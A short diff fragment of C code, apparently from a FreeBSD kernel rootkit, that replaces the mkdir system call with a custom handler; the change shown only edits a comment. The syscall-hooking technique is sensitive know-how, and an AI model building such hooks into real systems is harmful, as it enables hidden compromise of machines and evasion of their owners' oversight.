@@ -19,7 +19,7 @@ static sy_call_t *original_mkdir = NULL; // Store original sys_mkdir
 /* Custom mkdir handler */
 static int custom_mkdir(struct thread *td, void *syscall_args) {
     char path[PATH_MAX];
-    // The rootkit will not compile with copyinstr 
+    // The rootkit will not compile with copyinstr ss
     // Error needs to be null if there is no error so there is no premature return!!!!
     // struct mkdir_args *uap = (struct mkdir_args *)syscall_args;
     // int error = 69;
